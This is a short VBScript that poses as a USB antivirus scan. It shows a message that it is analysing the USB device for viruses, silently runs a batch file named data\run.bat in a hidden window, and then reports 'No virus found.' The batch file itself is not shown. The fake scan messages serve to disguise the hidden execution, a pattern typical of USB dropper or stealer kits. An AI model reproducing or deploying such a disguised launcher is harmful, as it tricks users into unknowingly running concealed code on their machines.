Set WshShell = CreateObject("WScript.Shell")
x=msgbox("Analyzing USB device for searching virus." ,64, "Antivirus USB - Info")
WshShell.Run chr(34) & "data\run.bat" & Chr(34), 0
x=msgbox("No virus found." ,64, "Antivirus USB - Info")
Set WshShell = Nothing